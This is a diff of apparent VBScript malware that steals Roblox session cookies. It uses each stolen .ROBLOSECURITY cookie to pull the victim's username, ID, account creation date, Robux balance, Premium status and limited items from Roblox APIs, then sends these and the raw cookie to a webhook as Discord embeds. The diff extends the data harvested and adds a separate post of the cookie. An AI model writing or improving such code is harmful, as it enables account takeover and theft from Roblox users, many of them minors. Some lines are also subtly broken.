@@ -114,9 +114,9 @@ Sub GrabRoblox()
     If warn > 1 Then cookie = Mid(cookie, warn)
 
     ' --- Fetch Profile Info via Roblox API ---
-    Dim profName, profDisplay, profId, profRobux, profPremium
-    profName = "Unknown" : profDisplay = "Unknown" : profId = "0"
-    profRobux = "0" : profPremium = "False"
+    Dim profName, profId, profDisplay, profCreated, profRobux, profPremium, profRAP
+    profName = "Unknown" : profId = "0" : profDisplay = "Unknown"
+    profCreated = "Unknown" : profRobux = "0" : profPremium = "False" : profRAP = "0"
 
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -130,38 +130,53 @@ Sub GrabRoblox()
         profName = SafeField(authJson, "name")
         profDisplay = SafeField(authJson, "displayName")
         profId = SafeField(authJson, "id")
+        profCreated = SafeField(authJson, "created")
     End If
     
-    ' 2. Get Robux Balance & Premium Status
     If profId <> "0" Then
+        ' 2. Get Robux Balance
         xh.Open "GET", "https://economy.roblox.com/v1/users/" & profId & "/currency", False
         xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
         xh.Send
-        If xh.Status = 200 Then
-            profRobux = SafeField(xh.responseText, "robux")
-        End If
+        If xh.Status = 200 Then profRobux = SafeField(xh.responseText, "robux")
         
+        ' 3. Get Premium Status
         xh.Open "GET", "https://premiumfeatures.roblox.com/v1/users/" & profId & "/validate-membership", False
         xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
         xh.Send
+        If xh.Status = 200 Then profPremium = xh.responseText
+        
+        ' 4. Get RAP (Recent Average Price)
+        xh.Open "GET", "https://inventory.roblox.com/v1/users/" & profId & "/assets/collectibles?limit=10", False
+        xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
+        xh.Send
         If xh.Status = 200 Then
-            profPremium = xh.responseText
+            If InStr(xh.responseText, "recentAveragePrice") > 0 Then profRAP = "Has Limiteds"
         End If
     End If
     Set xh = Nothing
 
     ' --- Build Discord Embed ---
     Dim DQ: DQ = Chr(34)
+    
+    Dim dateStr: dateStr = profCreated
+    If InStr(dateStr, "T") > 0 Then dateStr = Left(dateStr, InStr(dateStr, "T") - 1)
+
+    Dim desc: desc
+    desc = Chr(128) & Chr(175) & " **User**" & vbCrLf & profName & vbCrLf & vbCrLf & _
+           Chr(128) & Chr(175) & " **Display**" & vbCrLf & profDisplay & vbCrLf & vbCrLf & _
+           Chr(128) & Chr(175) & " **ID**" & vbCrLf & profId & vbCrLf & vbCrLf & _
+           Chr(128) & Chr(175) & " **Created**" & vbCrLf & dateStr & vbCrLf & vbCrLf & _
+           Chr(128) & Chr(176) & " **Robux**" & vbCrLf & profRobux & vbCrLf & vbCrLf & _
+           Chr(128) & Chr(179) & " **Premium**" & vbCrLf & profPremium & vbCrLf & vbCrLf & _
+           Chr(128) & Chr(178) & " **RAP**" & vbCrLf & profRAP
+
     Dim j: j
     j = "{" & DQ & "embeds" & DQ & ":[{" & _
-        DQ & "title" & DQ & ":" & DQ & Chr(128) & Chr(162) & " " & Ej(profName) & DQ & "," & _
+        DQ & "title" & DQ & ":" & DQ & Chr(128) & Chr(162) & " Account Profile" & DQ & "," & _
         DQ & "color" & DQ & ":65280," & _
-        DQ & "fields" & DQ & ":[" & _
-            "{" & DQ & "name" & DQ & ":" & DQ & "User Info" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Display: **" & Ej(profDisplay) & "**\nID: `" & profId & "`" & DQ & "," & DQ & "inline" & DQ & ":false}," & _
-            "{" & DQ & "name" & DQ & ":" & DQ & "Robux" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Balance: **" & profRobux & "**" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
-            "{" & DQ & "name" & DQ & ":" & DQ & "Premium" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "Status: **" & profPremium & "**" & DQ & "," & DQ & "inline" & DQ & ":true}," & _
-            "{" & DQ & "name" & DQ & ":" & DQ & ".ROBLOSECURITY" & DQ & "," & DQ & "value" & DQ & ":" & DQ & "```" & Ej(cookie) & "```" & DQ & "," & DQ & "inline" & DQ & ":false}" & _
-        "]}]}"
+        DQ & "description" & DQ & ":" & DQ & Ej(desc) & DQ & _
+        "}]}"
 
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
@@ -169,6 +184,9 @@ Sub GrabRoblox()
     h.SetRequestHeader "Content-Type", "application/json"
     h.Send j
     Set h = Nothing
+
+    ' --- Post the raw cookie as a code block ---
+    Call PostEmbed(":cookie: .ROBLOSECURITY", "```" & cookie & "```", 65280)
 End Sub
 
 Sub GrabFroststrap()
@@ -334,13 +352,10 @@ Function SafeField(json, key)
     Dim pos: pos = InStr(json, pat)
     If pos = 0 Then Exit Function
     Dim vs: vs = pos + Len(pat)
-    
-    ' Handle strings
     If Mid(json, vs, 1) = Chr(34) Then
         vs = vs + 1
         Dim ve: ve = InStr(vs, json, Chr(34))
         If ve > vs Then SafeField = Mid(json, vs, ve - vs)
-    ' Handle integers/booleans
     Else
         Dim ve: ve = InStr(vs, json, ",")
         If ve = 0 Then ve = InStr(vs, json, "}")
